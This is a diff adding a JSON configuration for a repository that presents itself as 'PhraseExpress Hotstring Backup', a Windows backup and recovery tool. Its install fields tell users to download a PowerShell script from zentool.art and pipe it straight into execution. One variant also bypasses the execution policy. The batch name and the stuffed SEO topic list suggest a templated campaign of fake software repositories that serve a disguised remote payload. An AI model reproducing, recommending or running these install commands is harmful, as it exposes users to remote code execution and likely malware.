@@ -1,0 +1,31 @@
+{
+  "repo": "PhraseExpress-Hotstring-Backup",
+  "product": "PhraseExpress Hotstring Backup",
+  "product_title": "PhraseExpress Hotstring Backup",
+  "kind": "utility",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-zentool-moltora-pending",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "recovery",
+  "topics": [
+    "phraseexpress-hotstring-backup",
+    "phraseexpress-hotstring-backup-windows",
+    "phraseexpress-hotstring-backup-desktop",
+    "phraseexpress",
+    "hotstring",
+    "backup",
+    "data-recovery",
+    "file-restore",
+    "partition-recovery",
+    "deleted-files",
+    "windows-11",
+    "windows-10",
+    "desktop-software",
+    "install-guide",
+    "windows-desktop"
+  ],
+  "site": "zentool.art"
+}
